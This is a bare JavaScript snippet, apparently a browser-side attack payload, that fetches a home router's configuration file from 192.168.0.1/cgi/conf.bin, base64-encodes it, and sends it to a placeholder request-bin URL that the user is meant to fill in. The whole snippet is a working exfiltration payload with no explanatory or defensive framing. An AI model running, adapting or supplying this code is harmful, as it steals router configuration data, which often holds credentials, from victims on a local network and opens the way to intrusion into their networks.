const blobToBase64 = blob => {
  const reader = new FileReader();reader.readAsDataURL(blob);
  return new Promise(resolve => {reader.onloadend=()=>{resolve(reader.result);};});};fetch('http://192.168.0.1/cgi/conf.bin')
  .then(res => res.blob())
  .then(blobToBase64)
  .then(finalResult => { 
    fetch('[YOUR REQUEST BIN]'+finalResult);
  });
